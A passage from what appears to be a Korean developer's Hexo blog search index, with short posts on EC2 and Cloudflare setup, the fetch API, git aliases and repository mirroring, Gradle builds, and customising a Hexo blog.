그러면 3이라고 표시한 주황색 박스에 해당 인스턴스가 추가되는 걸 확인할 수 있다. 검토화면에서 다음버튼 로드밸런서 메인화면으로 넘어와지면 생성된 로드밸런서의 DNS이름을 복사한다. 이제 cloudflare dns 설정만 하면 끝이다! cloudflare dns 설정 cloudflare에 와서 위처럼 새로운 레코드를 추가하고 타입은 CNAME, 이름은 @, 대상은 방금 복사한 로드밸런서 DNS이름을 넣어주고 저장을 누르면 완료다. 끝 이제 자신의 도메인으로 접속을 해보면…. https..! 여기서 잠깐..! 처음에 npm start로 웹 앱을 실행시켰는데 이러면 ec2 리모트를 종료하는 순간 앱도 같이 종료된다. nohup export PORT=8080&amp;&amp; node ./bin/www &amp; 이런식으로 실행해야 ec2 리모트를 종료해도 웹 앱이 계속 살아 있다. 참고 ; linux node app 백그라운드 실행 참고 https://youtu.be/dMVy3BQB314","link":"/2020/10/30/ec2-web-app-https-%EC%A0%81%EC%9A%A9%ED%95%98%EA%B8%B0/"},{"title":"em vs rem","text":"em 상위 요소 기준 rem 최상위 요소 html 기준","link":"/2020/11/19/em-vs-rem/"},{"title":"eslint prefer-template","text":"react typescript eslint airbnb style 로 웹 개발을 하고 있는데,,, + 로 문자열 이어붙이기를 사용했는데, eslint룰에 따라 자동 포맷팅 되었다..! eslint가 처음에는 불편하기만 했는데, 지금은 너무 좋다… 참고 https://eslint.org/docs/rules/prefer-template","link":"/2020/12/15/eslint-prefer-template/"},{"title":"etc 카테고리 생성","text":"잡다한 소리를 하는 곳입니다.","link":"/2020/09/17/etc-%EC%B9%B4%ED%85%8C%EA%B3%A0%EB%A6%AC-%EC%83%9D%EC%84%B1/"},{"title":"favicon이 안나오는 문제","text":"로컬에서는 분명히 잘나오는데.. 깃허브에 배포만 하면 파비콘이 사라진다?? 해결하기1234head: # URL or path to the website's icon favicon: /img/favicon.png? # Open Graph metadata _config.icarus.yml 에서 상단에 favicon을 설정하는 부분이 있다. 맨 끝에 ?를 추가한다. 끝! 이러면 깃허브 페이지에서도 favicon이 잘 나온다. 참고 https://stackoverflow.com/questions/46163065/github-pages-website-favicon-not-showing","link":"/2020/09/17/favicon%EC%9D%B4-%EC%95%88%EB%82%98%EC%98%A4%EB%8A%94-%EB%AC%B8%EC%A0%9C/"},{"title":"fetch api 연습","text":"12345678910fetch('http://localhost:3000/users') .then(function (response) { return response.json(); }) .then(function (myJson) { console.log(JSON.stringify(myJson)); }) .catch(function (error) { console.log(error); }); https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/fetch fetch api 써먹기users router12345let users = [];app.get('/users', (req, res) =&gt; { return res.json(users);}); fetch api1234567891011121314151617181920212223242526272829303132333435function getUserList() { // listbox 초기화 let newListbox = document.createElement('li'); newListbox.innerHTML = `&lt;li class=&quot;list-group-item head&quot;&gt;User List&lt;/li&gt;`; const url = '/users'; const fetchResponsePromise = fetch(url); fetchResponsePromise .then((response) =&gt; { if (response.status === 200) { return response.json(); } else { throw new Error('Something went wrong on api server!'); } }) .then((response) =&gt; { console.log(`fetch`, response); let i = 0; for (const key in response) { i++; if (response.hasOwnProperty(key)) { const element = response[key]; const new_li_element = document.createElement('li'); new_li_element.className = 'list-group-item'; new_li_element.appendChild(document.createTextNode(element)); newListbox.appendChild(new_li_element); } } listbox.innerHTML = newListbox.innerHTML; }) .catch((error) =&gt; { console.error(error); });} users라는 라우터에서는 유저배열을 반환한다. 유저배열을 json으로 받는데, 그걸 받아서 화면에서 유저목록을 갱신한다. 나는 ajax하면 xhr객체를 만들어서 가져오곤 했는데 이번에는 fetch를 사용해 보았다. fetch가 간단하고 간결한 것 같다. 이 코드가 들어 있는 프로젝트 : Chat App (NodeJs &amp; Socket.IO )","link":"/2020/10/28/fetch-%EC%97%B0%EC%8A%B5/"},{"title":"firebase 호스팅한 앱 종료하기","text":"firebase를 처음 사용해보았다. 비용 걱정으로 호스팅한 앱이나, 함수들을 사용하지 않을 때 꺼두려고 한다. 호스팅 종료 cli에서 firebase-tools 를 이용해야한다. terminal1firebase hosting:disable 호스팅했던 앱 url로 접속해서 확인해보자 함수 삭제 함수(백엔드, api)는 브라우저로 firebase 콘솔에 접속해서 삭제할 수 있다. 참고 how-do-i-remove-a-hosted-site-from-firebase","link":"/2020/12/02/firebase-%ED%98%B8%EC%8A%A4%ED%8C%85-%EC%A2%85%EB%A3%8C/"},{"title":"flex box로 수평수직 가운데 정렬하기","text":"index.html123456789101112131415161718192021222324&lt;style&gt; html { height: 100vh; } body { height: 100%; } .flexbox-container { display: flex; height: 100%; justify-content: center; align-items: center; } .flexbox-item { background-color: #ddd; }&lt;/style&gt;&lt;div class=&quot;flexbox-container&quot;&gt; &lt;div class=&quot;flexbox-item&quot;&gt;hello world!&lt;/div&gt;&lt;/div&gt; 1234.flexbox-container { justify-content: center; align-items: center;} flex box로 수평수직 가운데 정렬하기","link":"/2020/11/19/flex-box%EB%A1%9C-%EC%88%98%ED%8F%89%EC%88%98%EC%A7%81-%EA%B0%80%EC%9A%B4%EB%8D%B0-%EC%A0%95%EB%A0%AC%ED%95%98%EA%B8%B0/"},{"title":"git branch rename 브랜치명 변경","text":"상황 로컬에 있는 퍼블리쉬하지 않은 브랜치 이름 바꾸기 브랜치이름 바꾸기 git branch -m {바꿀 브랜치명} {새로운 브랜치명} 참고 Git Branch 이름 변경하기","link":"/2020/11/18/git-branch-rename-%EB%B8%8C%EB%9E%9C%EC%B9%98%EB%AA%85-%EB%B3%80%EA%B2%BD/"},{"title":"forEach await 안되는 문제","text":"상황 배열로 저장되어 있는 데이터를 forEach로 순회하면서 db에 INSERT하는 쿼리를 만들려고 했다 근데 비동기적으로 동작했다 123await data.forEach(async (element: ArticlePreview, idx: number) =&gt; { // insert query}); 해결123456789for (const element of data) { // ... try { const a = await databaseConnection.query(queryString, [ // ... ]); } // ... } for of에서는 await을 통해서 순차적으로 처리가 가능했다 시도해보지 않은 다른 방향 한번에 INSERT하기 https://stackoverflow.com/questions/8899802/how-do-i-do-a-bulk-insert-in-mysql-using-node-js 참고 https://stackoverflow.com/questions/37576685/using-async-await-with-a-foreach-loop","link":"/2021/01/05/forEach-await-%EC%95%88%EB%90%98%EB%8A%94-%EB%AC%B8%EC%A0%9C/"},{"title":"git clone 커밋 히스토리없이 가볍게 클론하기","text":"terminal1git clone --depth 1 https://github.com/chinsun9/refactor-2019T1.git git clone을 통해 클론하게되면 .git 폴더도 같이 딸려온다. .git 폴더없이 최신 상태만 가져오고싶을 때 어떻게 할까 찾아보다가 --depth 옵션을 알게되었다. --depth 1 하게되면 가장 마지막 상태만 클론하게된다. 참고 copy-a-git-repo-without-history","link":"/2020/11/12/git-clone-%EC%BB%A4%EB%B0%8B-%ED%9E%88%EC%8A%A4%ED%86%A0%EB%A6%AC%EC%97%86%EC%9D%B4-%EA%B0%80%EB%B3%8D%EA%B2%8C-%ED%81%B4%EB%A1%A0%ED%95%98%EA%B8%B0/"},{"title":"git commit push 명령 합치기","text":"git commit 이랑 git push 명령을 합치고 싶은 욕구가 생겼다 1git config --global alias.acp '! acp() { git commit -a -m &quot;$1&quot; &amp;&amp; git push ; } ; acp' git bash를 열고 위 명령을 수행한다 acp란 이름으로 git alias를 추가한다. --global옵션을 줘서 어디서든 실행될 수 있도록 한다 --global옵션을 주지 않으면 현재 깃 디렉터리에만 적용이 된다 1git acp &quot;커밋 메시지&quot; 이런 식으로 사용한다 참고 https://stackoverflow.com/questions/19595067/git-add-commit-and-push-commands-in-one","link":"/2021/01/06/git-commit-push-%EB%AA%85%EB%A0%B9-%ED%95%A9%EC%B9%98%EA%B8%B0/"},{"title":"git push -f","text":"1git push -f 바로 직전 커밋 취소를 했는데 푸쉬하니가 멀쥐가 되었다…? git push -f -f, --force옵션은 푸쉬하는데 원격 저장소를 아예 덮어쓰는 옵션이다. 따라서 이미 원격 저장소에 올렸는데 커밋을 수정한 경우에 사용할 수 있다.","link":"/2020/10/19/git-push-f/"},{"title":"git 명령어 줄이기","text":"123git config --global alias.r '! r() { git reset --soft HEAD~&quot;$1&quot; ; } ; r'git config --global alias.r1 '! r1() { git reset --soft HEAD~1 ; } ; r1' git reset --soft HEAD~1 마지막 커밋 하나를 취소하는 명령어이다 나는 보통 여러 컴퓨터에서 작업할 때, 일단 작업 중을 내용을 임시적으로 커밋 푸쉬해서 깃허브에 업로드한다 다른 컴퓨터에서 풀로 받아오고, 이 임시적인 커밋을 취소할 때 명령어를 길게 쓰는 게 귀찮아서 alias로 짧게 줄여보았다 git r 2 ; 숫자만큼 커밋 취소하기 git r1 ; 마지막 커밋 취소하기 참고 https://chinsun9.github.io/2021/01/06/git-commit-push-명령-합치기/","link":"/2021/01/14/git-%EB%AA%85%EB%A0%B9%EC%96%B4-%EC%A4%84%EC%9D%B4%EA%B8%B0/"},{"title":"github api로 유명한 레포 첫 커밋 메시지 확인하기","text":"엄청큰 오픈소스 저장소를 보면 커밋 개수가 어마어마하다. 첫 커밋을 확인하려고, 브라우저에서 커밋 목록으로 들어가서 한페이지 한페이지씩 넘겨가면서 찾을 수 없을 것이다. vscode의 첫번째 커밋은 어떤 커밋일까? Hello Code github api로 첫 커밋 확인하기 약간 수동적인 방법이다. https://api.github.com/repos/microsoft/vscode/commits?page=73698&amp;per_page=1 브라우저로 vscode 레포에 접속해서 총 커밋 개수를 확인한다. github api 중에 커밋 목록을 보여주는 api가 있다. 파라미터로 page에 커밋 개수를, per_page는 1로 설정해주면 첫번째 커밋을 가져올 수 있다. 그리고 시간이 지남에 따라 새로운 커밋이 생기고, 커밋 개수가 증가하게 되면서, 나중에 다시 보려면 page 파라미터의 값을 새롭게 설정해줘야 하는 문제가 있다. 참고 찾아보니까 스크립트로 여러사람들이 만들어 놓은것을 확인할 수 있었다. shell script https://gist.github.com/0penBrain/7be59a48aba778c955d992aa69e524c5 python, js https://gist.github.com/yershalom/a7c08f9441d1aadb13777bce4c7cdc3b","link":"/2020/12/02/github-api%EB%A1%9C-%EC%9C%A0%EB%AA%85%ED%95%9C-%EB%A0%88%ED%8F%AC-%EC%B2%AB-%EC%BB%A4%EB%B0%8B-%EB%A9%94%EC%8B%9C%EC%A7%80-%ED%99%95%EC%9D%B8%ED%95%98%EA%B8%B0/"},{"title":"github api로 특정 저장소의 커밋내역 불러오기","text":"깃허브 api로 특정 저장소 커밋내역 json으로 받아보기 나는 내 special repository인 chinsun9 저장소의 커밋내역을 받아와보았다. github api https://api.github.com/repos/chinsun9/chinsun9/commitshttps://api.github.com/repos/{유저명}/{저장소명}/commits js에서는 fetch api로 데이터를 가져와 원하는 로직을 수행하면 될 것 같다. github api가 있다는 것을 알아보았고, 맛보기를 해보았다. 비공개 저장소 접근이나 다른 유용한 api가 있는지 알아보고 활용하면 좋을 것 같다.","link":"/2020/11/02/github-api%EB%A1%9C-%ED%8A%B9%EC%A0%95-%EC%A0%80%EC%9E%A5%EC%86%8C%EC%9D%98-%EC%BB%A4%EB%B0%8B%EB%82%B4%EC%97%AD-%EB%B6%88%EB%9F%AC%EC%98%A4%EA%B8%B0/"},{"title":"github blog, page google analytics로 측정하기","text":"깃헙 페이지에 google analytics 를 적용하고, 사용자 통계를 받아보자. 환경 나는 hexo에서 icarus 테마를 사용하고 있다. 애널리틱스 계정 생성 계정 생성이라는 것을 먼저해주었다. https://analytics.google.com/analytics/web/provision/?hl=ko&amp;pli=1#/provision 측정 시작이라는 버튼을 누른다. 계정 이름을 적당히 입력한다. 속성 설정을 적당히 입력한다. 비즈니스 정보를 입력한다. 처음 애널리틱스를 사용해 보아서 이게 맞나 싶었는데, 이 과정을 거쳐야한다.. 애널리틱스 데이터 스트림 설정 게정 생성을 완료하면 이런 화면이 나오는데, 웹을 선택한다. https, 내 깃헙 주소, 스트림 이름을 입력하고 스트림 만들기를 선택한다. 측정 ID 를 복사한다. // 다른 블로그들을 봤을 때, 예전에는 추적 ID였던 것이 측정 ID로 용어가 바뀌였다. hexo config.yml google_analytics 설정 나는 hexo icarus 테마를 사용하고 있다. icarus 테마 설정파일인 _config.icarus.yml 에 위처럼 추가해주었다. 내 기준으로 290라인 정도에 위치하고있다. 적용된 것 확인하기 hexo generate 명령어로 현재 설정이 적용이 되었나 확인해보자 vscode에서 ctrl shift f 를 눌러 검색창을 띄우고, 자신의 측정 ID를 검색해보자 그러면 생성된 모든 .html 파일에서 검색되는 것을 확인할 수 있다. 그러면 이제 배포하고, 약간 기다리면 애널리틱스 대시보드에서 카운팅 되는 것을 확인할 수 있다.","link":"/2020/11/20/github-blog-page-google-analytics%EB%A1%9C-%EC%B8%A1%EC%A0%95%ED%95%98%EA%B8%B0/"},{"title":"github hexo blog web font 적용하기","text":"기본 한글 폰트가 너무 구려서 웹폰트라는 것을 적용시켜보았다. http://deminoth.github.io/google-font-kor/ 한글 폰트 나눔 고딕을 적용해보았다. 환경 나는 hexo에서 icarus 테마를 사용하고 있다. 폰트 고르기 https://fonts.google.com/?subset=korean theme 코드 변경layout/common/head.jsx12345678910// 51 lineconst fontCssUrl = { default: fontcdn(&quot;Ubuntu:wght@400;600&amp;family=Source+Code+Pro&quot;, &quot;css2&quot;), cyberpunk: fontcdn(&quot;Oxanium:wght@300;400;600&amp;family=Roboto+Mono&quot;, &quot;css2&quot;), nanumgothic: fontcdn(&quot;Nanum+Gothic:wght@400&amp;family=Roboto&quot;, &quot;css2&quot;),};// 151 line&lt;link rel=&quot;preconnect&quot; href=&quot;https://fonts.gstatic.com&quot; /&gt;&lt;link href={fontCssUrl['nanumgothic']} rel=&quot;stylesheet&quot; /&gt; fontcdn 이라는 메서드가 있어서 그냥 활용했다. icarus theme config 파일의 fontcdn이 google로 되어있어서 그대로 사용할 수 있었다. include/style/base.styl 8 line12$family-sans-serif ?= 'Nanum Gothic', Ubuntu, Roboto, 'Open Sans', 'Microsoft YaHei', sans-serif// $family-sans-serif ?= Ubuntu, Roboto,'Nanum Gothic Coding', 'Open Sans', 'Microsoft YaHei', sans-serif 나눔고딕을 3순위로 했는데, 영어랑 한글이랑 부자연스러운 것 같아서 그냥 나눔고딕을 1순위로 올렸다. include/style/article.styl 4 line1$article-font-size ?= 1.3rem 하는 김에 본문 폰트 사이즈도 키워주었다. 확인하기12hexo generatehexo server 잘 갱신되었는지 확인한다. 배포하기 전 확인하기 hexo server에서는 최신 css 상태를 반영하는데, 그런데 실제로 배포될 때는 css파일이 갱신이 안된다. 그래서 public/css/default.css 파일을 삭제하고, 다시 hexo generate로 생성해야한다. 그리고 배포한다. 참고 Jekyll 기반의 GitHub Page 생성(3) - 웹 폰트 설정","link":"/2020/11/20/github-hexo-blog-web-font-%EC%A0%81%EC%9A%A9%ED%95%98%EA%B8%B0/"},{"title":"github.io 저장소에 readme.md 만들기","text":"- 더이상 github.io 저장소가 허전하지 않게 되었다! source/readme.md 생성 _config.yml 에서 skip_render에 readme 추가1234i18n_dir: ':lang'skip_render: - readme.mdnew_post_name: ':title:year:month:day.md' 의문 skip_render에 추가했는데 어째서인지 readme.html이 자동생성된다.. gitignore에도 추가해 보았는데 무시가 안된다 참고","link":"/2020/09/17/github-io-%EC%A0%80%EC%9E%A5%EC%86%8C%EC%97%90-readme-md-%EB%A7%8C%EB%93%A4%EA%B8%B0/"},{"title":"github 저장소 복제","text":"123456789git clone --bare -b docker --single-branch https://github.com/chinsun9/2020-web-test.gitcd 2020-web-test.gitgit push --mirror https://github.com/chinsun9/2020-web-test-mirror.gitcd ..rmdir /s 2020-web-test.git 우선 터미널에서 작업하기 전에 새로운 깃허브 저장소를 하나 생성한다.(복제될 저장소) 2020-web-test의 docker 브랜치를 bare clone 한다. bare clone하게되면 소스코드가 보이지않고 이런 요상한 파일들이 보인다. 평범히 클론했다면 .git 디렉터리에 있는 내용들이다. cd 2020-web-test.git로 들어가주고 git push --mirror https://github.com/chinsun9/2020-web-test-mirror.git 새로운 저장소로 mirror옵션을 주고 푸쉬하게되면 커밋내역까지 똑같이 저장소가 복제된다. 오른쪽이 복제한 저장소이고, 복제한 저장소에서 하나의 커밋을 하였다. rmdir /s 2020-web-test.git 이제 이 쓸모없는 디렉터리는 삭제하고 복제한 저장소를 git clone https://github.com/chinsun9/2020-web-test-mirror.git 클론해서 사용하면된다. 용도? 퍼블릭 저장소에 올렸던 프로젝트를 계속 이어하는데 dbconfig파일이나, 보여주고싶지않은 정보가 있을 수 있다. 처음에는 비공개 브랜치? 이런 키워드로 찾아봤었는데, 그런 기능은 없었다. 프로젝트를 통째로 복사해서 새롭게 git init 하는 방법도 있는데, 이 방법을 통해서 커밋내역을 유지하면서 복제할 수 있었다. 참고 Duplicating a repository","link":"/2020/11/12/github-%EC%A0%80%EC%9E%A5%EC%86%8C-%EB%B3%B5%EC%A0%9C/"},{"title":"git 카테고리 생성","text":"git, github 공부한 내용 올리기","link":"/2020/09/18/github-%EC%B9%B4%ED%85%8C%EA%B3%A0%EB%A6%AC-%EC%83%9D%EC%84%B1/"},{"title":".gitignore 써서 커밋 가볍게 하기","text":"깔끔하게 코드 공유하기, 숨겨야하는 파일 숨기기! 따라하기준비물 깃허브 데스크탑 이클립스 (java IDE) 샘플 자바 프로젝트 만들기 이런 구조의 자바 프로젝트가 있다..├── .settings│ └── org.eclipse.jdt.core.prefs├── bin│ ├── HelloWorld.class│ └── Tmp.class├── src│ ├── HelloWorld.java│ └── Tmp.java├── .gitignore├── .classpath└── .project .java 파일은 컴파일 과정을 통해 .class 파일이 된다. 코드를 공유할때 java파일만 있어도 충분히 공유 받은 사람이 컴파일해서 사용할 수 있다. .class 파일은 공유할 필요가 없는 것이다. .gitignore 파일이 빈파일이라고 하면 총 8개의 파일이 트랙된다. .gitignore에 *.class추가하기.gitignore1*.class .gitignore 에 위 내용을 추가하면 이렇게 .class 파일이 빠지고 6개 파일만 트랙된다. 이렇게해서 내 로컬에는 남아있지만 깃에서는 무시된다. 깃허브 데스크탑에서 gitignore 파일 추가하기 Tmp.java는 내가 혼자 막 테스트하느라 임시로 생성한 파일이라고 해보자. 다른사람이 봐도 아무 의미가 없는 파일이라면 .gitignore에 추가해준다. 깃허브 데스크탑에서 우클릭으로 무시 목록에 추가해보았다. 그러면 이렇게 자동으로 .gitignore이 업데이트 된다. 이렇게 Tmp.java가 무시되어 5개만 트랙되는 모습니다. 이런식으로 특정 파일을 골라서 무시할 수 있다. 이제 init이라는 커밋 하나를 해보겠다. 이미 커밋한 파일 gitignore하기 HelloWolrd.java를 수정했다. 근데 HelloWolrd.java도 .gitignore에 추가해야할 거 같아서 Tmp.java와 같은 방법으로 무시하기를 했는데… .gitignore에 분명이 추가되었지만 여전히 트랙되고있다… 이미 한번 커밋된적이 있는 파일들을 새로이 .gitignore에 추가했을때 생기는 문제다. 이럴 때는 터미널에 git rm -r --cached .명령을 통해 캐시를 삭제하고.. cmd1git rm -r --cached . 깃허브 데스크탑으로 돌아와보면 이렇게 제외되있는걸 확인할 수 있다. 초록색 + 표시는 무시해도된다. 이미 커밋되었지만 캐시가 삭제되서 다시 나타난 거다. 여기까지 커밋 내역팁 이렇게 하나씩 수동으로 무시할 파일을 지정하는 방법이 있지만 프로젝트 구조가 비슷하기 때문에 사람들이 미리 정의해둔 .gitignore을 쓰면 편리하다. 깃허브 데스크탑에서 로컬 저장소를 생성할때 gitignore을 설정하는데 그렇게 쓰는 방법도 있고, https://www.toptal.com/developers/gitignore 여기서 자신이 어떤 언어를 쓰는지, 어떤 IDE를 쓰는지에 따라서 자동 생성해준다.","link":"/2020/09/24/gitignore-%EC%8D%A8%EC%84%9C-%EC%BB%A4%EB%B0%8B-%EA%B0%80%EB%B3%8D%EA%B2%8C-%ED%95%98%EA%B8%B020200924/"},{"title":"gradle project 에서 runnable jar 생성하기","text":"일반 자바 프로젝트 처럼 Export &gt; Runnable JAR file로 jar을 만들게 되면 생성된 jar파일의 용량이 매우 작은것을 확인할 수 있다. 내가 추가한 외부 라이브러리들이 전부 빠져서 동작하지 않는다 gradle project에서는 어떤방식으로 runable jar을 만들어야 할까? build.gradle 수정하기build.gradle12345678910jar { manifest { attributes 'Main-Class': 'tmp.gradle.project.Main' } from { configurations.compile.collect { it.isDirectory() ? it : zipTree(it) } }} jar { … } 에 해당하는 부분을 위처럼 새로이 추가해준다. attributes 'Main-Class': 'tmp.gradle.project.Main' 여기에는 자신의 메인 클래스를 지정하면된다. jar파일 생성하기 terminal12cd {gradle project rootpath}gradle jar 자신의 그래들 프로젝트 경로에서 cmd를 켜주고 gradle jar 명령을 실행한다. jar파일 확인하기 build/libs 디렉터리에 가보면 jar파일이 생성되있음을 확인할 수 있다. terminal12cd build\\libsjava -jar {jar파일명} 로 한번 잘 실행되는지 확인한다.","link":"/2020/11/06/gradle-project-%EC%97%90%EC%84%9C-runnable-jar-%EC%83%9D%EC%84%B1%ED%95%98%EA%B8%B0/"},{"title":"이클립스에서 gradle 프로젝트 생성하기","text":"나는 C &gt; C++ &gt; java &gt; js 순으로 배웠다 요즘은 쭉 nodejs에서 npm, package.json 을 통해 모듈을 쉽게 설치하고 관리하였다 오랜만에 java로 돌아오니까 외부 라이브러리를 임포트할 때 불편하게 느껴졌다 gradle의 이론이 대해서는 자세히 모르지만, 이전에 build.gradle파일을 통해 라이브러리를 설치한 기억이 있어서 gradle 프로젝트를 생성, 사용해보았다 gradle 설치 Windows에 Gradle 설치하기 by Jeongjin Kim 를 보고 따라했다. https://gradle.org/releases/ 에 들어가서 garadle을 다운 받는다. Download: binary-only or complete 인데 나는 binary-only 를 다운받았다. .zip 파일로 받아지는데 적당한 위치에 압축을 풀어주고 환경변수를 세팅한다. GRADLE_HOME : 그래들 디렉터리 경로 ex) C:\\Tools\\gradle-6.6.1 path : %GRADLE_HOME%\\bin 새롭게 cmd를 열고 gradle -v하여 잘 설치되었는지 확인한다. 이클립스에 gradle 플러그인 설치 및 세팅 Gradle Beginner Tutorial 4 | How to create Gradle Project in Eclipse from Scratch | Windows &amp; Mac 을 보고 따라했다. 여기서는 맥, 윈도우 모두 알려주기때문에 뛰엄뛰엄 봐야한다. Help &gt; Marketplace 로 들어가 gradle을 검색한다. 코끼리 모양의 아이콘을 가진 Buildship Gradle Integration 3.0 을 인스톨했다. 이클립스 재시작 Window &gt; Preferences 로 들어간다. gradle을 검색하고 gradle 경로를 지정해준다. 여기서 C:\\Tools\\gradle-6.6.1 환경변수 설정에서 GRADLE_HOME으로 지정했던 경로를 적어준다. 이제 그래들 프로젝트를 생성해보자 File &gt; new &gt; other 로 들어가 gradle을 검색한다. gradle project를 선택하고 다음으로넘어가면 위 화면이 나온다. next Project name 을 적어준다. next next 조금 기다리면 된다. Finish 버튼이 활성화 되면 클릭. build.gradle 파일에서 원하는 라이브러리를 명시하고 참고 ; gradle로 외부라이브러리 설치하기 build.gradle 을 우클릭하고 Gradle &gt; Refesh Gradle Project 를 누르면 외부 라이브러리들이 설치된다. 설치된 라이브러리들은 이클립스 익스플로러에서 Project and External Dependencies에서 확인할 수 있다. 참고 Windows에 Gradle 설치하기 by Jeongjin Kim 를 보고 따라했다. Gradle Beginner Tutorial 4 | How to create Gradle Project in Eclipse from Scratch | Windows &amp; Mac 을 보고 따라했다. gradle로 외부라이브러리 설치하기 gradle project 에서 runnable jar 생성하기","link":"/2020/10/05/gradle/"},{"title":"gradle로 외부라이브러리 설치하기","text":"원하는 라이브러리 명 + gadle 키워드로 구글링한다 나는 json-simple 을 받아보겠다. 카피 그래들 탭인지 잘 확인하고 카피한다. build.gradle 파일로와서 dependencies에 추가하고 저정한다. Gradle Project Refresh 끝!","link":"/2020/11/06/gradle%EB%A1%9C-%EC%99%B8%EB%B6%80%EB%9D%BC%EC%9D%B4%EB%B8%8C%EB%9F%AC%EB%A6%AC-%EC%84%A4%EC%B9%98%ED%95%98%EA%B8%B0/"},{"title":"hexo icarus 테마 프로필영역 css 수정","text":"오랜만에 블로그 이미지 들을 바꿨다. 적용시키고 나니까 128x128 사이즈에 안어울리는 것 같아서 크기 제한을 풀었다. layout/widget/profile.jsx 37 line123{/* &lt;figure class=&quot;image is-128x128 mx-auto mb-2&quot;&gt; */}&lt;figure class=&quot;image mx-auto mb-2&quot;&gt; is-128x128 을 없애준다. 또는 자신의 고유한 클래스를 넣어주고 커스텀해도된다.","link":"/2020/12/03/hexo-icarus-%ED%85%8C%EB%A7%88-%ED%94%84%EB%A1%9C%ED%95%84%EC%98%81%EC%97%AD-css-%EC%88%98%EC%A0%95/"},{"title":"hexo db.json 초기화","text":"가끔 삭제한 페이지가 검색되거나 하는데, db.json을 삭제하면 알아서 갱신해준다.","link":"/2020/10/30/hexo-db-json-%EC%B4%88%EA%B8%B0%ED%99%94/"},{"title":"hexo new 할때 기본틀 지정하기","text":"새로 글을 쓸때마다 tags, category 지정하는게 귀찮아… 근데 자동으로 세팅해버리기 Front-matter 전문 용어로는 Front-matter 라고 한다. 설정하기 1234567---title: {{ title }}date: {{ date }}category: blogtags: - tag1thumbnail: /images/ scaffolds/post.md 를 입맛대로 수정한다. title, date 라는 변수를 사용할 수 있다.. 더 사용할 수 있는 변수는 여기를 참고한다. 같은 방법으로 page나 draft 도 수정할 수 있다. 재밌는 팁 {{ title.substring(1,title.length-1).replace(' ','-') }} 이런식으로 자바스크립트를 사용할 수 있다. 좋은 방법은 아닌 것 같은데.. 그냥 그럴 수 있다!","link":"/2020/09/17/hexo-new-%ED%95%A0%EB%95%8C-%EA%B8%B0%EB%B3%B8%ED%8B%80-%EC%A7%80%EC%A0%95%ED%95%98%EA%B8%B0/"},{"title":"hexo server로 로컬에서 미리보기","text":"배포하기 전에 로컬에서 미리보자 hexo server 위 명령어를 통해서 로컬에서 내 블로그를 미리 볼 수 있다. 4000번 포트로 접속하면 된다. hexo server -p 3000 과 같이 -p 옵션을 통해서 포트를 지정할 수도 있다. 가장 좋은 점은 변경 사항이 있으면 바로바로 갱신되어 나온다. 실험적인 시도들을 먼저 로컬에서 해보고 잘되면, 배포할 수 있다. 팁 이미지를 수정했는데 적용이 안되어 보일 수 있는데 브라우저 캐시 문제다. 배포해서 깃허브에 올라가면 제대로 수정된 이미지가 보인다 깃허브에 배포해도 그 즉시 적용이 되지 않고 조금 시간이 걸린다. 따라서 hexo server이 좋다!","link":"/2020/09/17/hexo-server%EB%A1%9C-%EB%A1%9C%EC%BB%AC%EC%97%90%EC%84%9C-%EB%AF%B8%EB%A6%AC%EB%B3%B4%EA%B8%B0/"},{"title":"hexo tag plugin 유튜브 재생목록 넣는법","text":"hexo post.md1{% youtube PL9hW1uS6HUfscJ9DHkOSoOX45MjXduUxo 'playlist' %} 게시하고싶은 재생목록의 id값을 알아온다. 재생목록을 가져온경우에는 id 뒤에 'playlist'를 붙여주면 된다. 나는 playlist라는 카테고리를 만들고 내가 듣는 노래를 이달의 재생목록처럼 업로드할려고 hexo에서 재생목록 표현하는 방법이 없나하고 알아보았다. 유튜브 재생목록 id 알아내기 https://www.youtube.com/playlist?list=PLdEiQV70x8ZGjg6ONGRZcZKIXMosQ6k-Bid : PLdEiQV70x8ZGjg6ONGRZcZKIXMosQ6k-B 게시하고싶은 재생목록에 들어가면 url에 list라는 파라미터가 있는데 그게 id이다. hexo tag-plugin12345{% youtube lJIrF4YjHfQ %}{% youtube PL9hW1uS6HUfscJ9DHkOSoOX45MjXduUxo 'playlist' %}{% youtube lJIrF4YjHfQ false %}{% youtube PL9hW1uS6HUfscJ9DHkOSoOX45MjXduUxo 'playlist' false %} 기본 md에서는 표현하지 못하는 것을 표현하게 해줌 당연히 hexo 블로그에서만 사용가능 맨 마지막에 false를 붙여주면 Enable privacy-enhanced mode 라고 유튜브 쿠키를 사용하지 않도록 한다. 참고 https://hexo.io/ko/docs/tag-plugins.html#Examples","link":"/2020/11/03/hexo-tag-plugin-%EC%9C%A0%ED%8A%9C%EB%B8%8C-%EC%9E%AC%EC%83%9D%EB%AA%A9%EB%A1%9D-%EB%84%A3%EB%8A%94%EB%B2%95/"},{"title":"hexo 포스트 CRUD","text":"hexo에서 포스트 하는법! CRUD로 비유하여 알려줍니다 C 새 포스트 쓰기 hexo new &quot;새 포스트&quot; 위 명령으로 새 포스트를 만든다. source/_posts/새-포스트.md 경로에 새로운 md가 만들어 진다. 해당 md를 열어 마크다운을 활용해서 글을 쓴다. 마크 다운 사용법은 여기 참고한다. hexo 사용법은 여기 참고한다. R 포스트 읽기hexo server 위 명령으로 로컬에서 내가 쓴 포스트가 잘 나오는지 확인해본다. U 포스트 수정하기 source/_posts 경로에서 수정하고 싶은 포스트를 찾아 수정한다. 업데이트 시각은 자동 갱신되니까 걱정하지 말도록. D 포스트 삭제하기 source/_posts 경로에서 삭제하고 싶은 포스트를 찾아 삭제한다. 그냥 글을 숨기고 싶다면 source 디렉터리 바깥으로 뺀다. APPLY 위 과정을 통해서 포스트를 CRUD 해봤다. 이제 깃허브 페이지에 적용시키고 싶다면 아래 명령을 사용한다.hexo generate &amp; hexo deploy","link":"/2020/09/22/hexo-%ED%8F%AC%EC%8A%A4%ED%8A%B8-CRUD/"},{"title":"hexo에서 초안, 작성중 사용하기","text":"너무 많은 포스트들 속에.. 파묻혀있는 새 글 draft 사용하기cmd1hexo new draft &quot;hexo에서 초안, 작성중 사용하기&quot; layout hexo에서는 새 포스트를 생서할때 layout이라는 것을 지정할 수 있다. 기본적으로 3개의 레이아웃이 있다. post, draft, page post레이아웃은 기본값이다. source/_posts/ 아래에 생성되게 만든다. page레이아웃은 페이지를 생성한다. source/ 아래에 생성되게 만든다. draft레이아웃은 source/_drafts/ 아래에 생성되게 만든다. Draft source/_drafts/ 아래에 생성된 md들은 기본적으로 렌더링 되지 않는다. 즉, 배포해도 블로그에 표시되지 않는다. 따라서 작성중인 글을 노출시키지 않을 수 있다. 또 포스트가 많아지면서 source/_posts 디렉터리가 